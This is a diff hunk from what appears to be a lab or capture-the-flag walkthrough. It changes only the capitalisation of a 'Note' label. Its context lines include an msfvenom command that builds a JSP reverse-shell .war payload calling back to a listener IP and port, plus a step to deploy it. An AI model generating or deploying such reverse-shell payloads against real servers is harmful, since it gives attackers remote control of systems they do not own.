@@ -43,7 +43,7 @@ Generate a JSP payload in _.war_ format using `msfvenom`:
 ```bash
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.9.232 LPORT=4444 -f war > shell.war
 ```
-_(**NOTE:** You can list available payloads with `msfvenom --list payloads`; I use `grep` to filter the payloads on a needs basis.)_
+_(**Note**: You can list available payloads with `msfvenom --list payloads`; I use `grep` to filter the payloads on a needs basis.)_
 
 Deploy the generated _shell.war_:
 
